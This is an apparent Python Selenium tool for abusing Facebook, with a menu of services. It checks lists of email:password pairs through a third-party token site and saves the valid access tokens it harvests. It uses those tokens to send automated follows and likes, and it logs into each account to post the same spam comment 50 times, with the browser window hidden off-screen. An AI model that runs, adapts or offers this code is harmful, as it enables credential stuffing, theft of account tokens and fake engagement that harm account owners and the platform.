try:
    from selenium import webdriver
    from time import sleep
    from colored import fg, attr
except:
    print('[-] Please Install Selenium And Colored')
    sleep(5)

print(fg('#f1c40f')+'''
███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
█████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝ 
██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗ 
██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                  
    
    [1] Extract Access Token 
    [2] Auto Followers
    [3] Auto Likes
    [4] Auto Comments (25=>1ACC)
    [5] Convert Link To ID

''')
# Select Services
select_service = input('[+] Enter Service ID : ')

# Run Service
if select_service == "1":
    exreact_upload = input('[+] Enter Email List Path : ')
    extract_emails = open(exreact_upload, 'r')
    
    # Read Accounts
    for email in extract_emails:
        sp = email.split(":")
        username = sp[0]
        password = sp[1]
        driver = webdriver.Chrome()
        driver.set_window_position(-10000,0)
        ok = '\n'
        driver.get('https://web.ftcontrolsv3.com/free_form_fb_get_access_token.php')
        driver.find_element_by_id('email').send_keys(username)
        driver.find_element_by_id('pass').send_keys(password + ok)
        data = driver.find_element_by_id('data')
        access = data.text
        if 'Invalid username or password (401)' in access:
            with open('die_access.txt', 'a+') as die:
                die.write(f'[DIE] => {username} : {password} \n')
                print(fg('red')+'[>>>] INVALID EMAIL OR PASSWORD [EXTRACTED > FALSE]'+attr('reset'))
                driver.quit()

        elif 'Invalid username or email address (400)' in access:
            with open('die_access.txt', 'a+') as die:
                die.write(f'[DIE] => {username} : {password} \n')
                print(fg('red')+'[>>>] INVALID EMAIL OR PASSWORD [EXTRACTED > FALSE]'+attr('reset'))
                driver.quit()

        elif 'User must verify their account on www.facebook.com (405)' in access:
            with open('die_access.txt', 'a+') as die:
                die.write(f'[DIE] => {username} : {password} \n')
                print(fg('red')+'[>>>] INVALID EMAIL OR PASSWORD [EXTRACTED > FALSE]'+attr('reset'))
                driver.quit()
        
        else:
            with open('live_access.txt', 'a+') as live:
                live.write(access + '\n')
                print(fg('green')+'[>>>] VALID EMAIL AND PASSWORD [EXTRACTED > TRUE]'+attr('reset'))
                driver.quit()

elif select_service == "2":
    follow_upload = input('[+] Enter Access Tokens List Path : ')
    follow_profil = input('[+] Enter Profile ID : ')
    follow_access = open(follow_upload, 'r')
    for access in follow_access:
        driver = webdriver.Chrome()
        driver.set_window_position(-10000,0)
        driver.get('https://web.ftcontrolsv3.com/free_form_fb_send_auto_follow_access_token.php')
        driver.find_element_by_id('data').send_keys(access)
        driver.find_element_by_id('urlpost').send_keys(follow_profil)
        driver.find_element_by_id('checktoken').click()
        sleep(15)
        print(fg('green')+'[+] Followers Sent Successfully Now Check Your Profile .'+attr('reset'))
        driver.quit()

elif select_service == "3":
    likes_upload = input('[+] Enter Access Tokens List Path : ')
    likes_postid = input('[+] Enter Post URL : ')
    likes_access = open(likes_upload, 'r')
    for access in likes_access:
        driver = webdriver.Chrome()
        driver.set_window_position(-10000,0)
        driver.get('https://web.ftcontrolsv3.com/free_form_fb_send_like_access_token.php')
        driver.find_element_by_id('data').send_keys(access)
        driver.find_element_by_id('urlpost').send_keys(likes_postid)
        driver.find_element_by_id('checktoken').click()
        sleep(10)
        print(fg('green')+'[+] Likes Sent Successfully Now Check Your Post .'+attr('reset'))
        driver.quit()

elif select_service == "4":
    comments_upload = input("[+] Enter Email List (username:password) Path : ")
    comments_postid = input("[+] Enter Post URL (mobile version) : ")
    comments_emails = open(comments_upload, 'r')
    for email in comments_emails:
        sp = email.split(":")
        username = sp[0]
        password = sp[1]
        driver = webdriver.Chrome()
        #driver.set_window_position(-10000,0)
        driver.get('https://m.facebook.com/login')
        ok = '\n'
        driver.find_element_by_name('email').send_keys(username)
        sleep(1)
        driver.find_element_by_name('pass').send_keys(password + ok)
        sleep(3)
        driver.find_element_by_xpath('//*[@id="root"]/div[1]/div/div/div[3]/div[2]/form/div/button').click()
        sleep(1)
        a = 0
        while a < 50:
            a += 1
            driver.get(comments_postid)
            sleep(2)
            driver.find_element_by_xpath('//*[@id="composerInput"]').send_keys('[ACTIVE] => TRUE <3 :)')
            sleep(1)
            driver.find_element_by_name('submit').click()
            sleep(3)
            print(fg('green')+'[COMMENTED] => TRUE'+attr('reset'))
        driver.quit()

elif select_service == "5":
    id_upload = input('[+] Enter Links File Path : ')
    id_emails = open(id_upload, 'r')
    for link in id_emails:
        driver = webdriver.Chrome()
        driver.set_window_position(-10000,0)
        driver.get('https://lookup-id.com/')
        ok = '\n'
        driver.find_element_by_name('fburl').send_keys(link + ok)
        data = driver.find_element_by_id('code').text
        with open('IDS.txt', 'a+') as ids:
            ids.write(data + '\n')
            print(fg('green')+f'[ID]=> {data} [LINK]=> {link}'+attr('reset'))

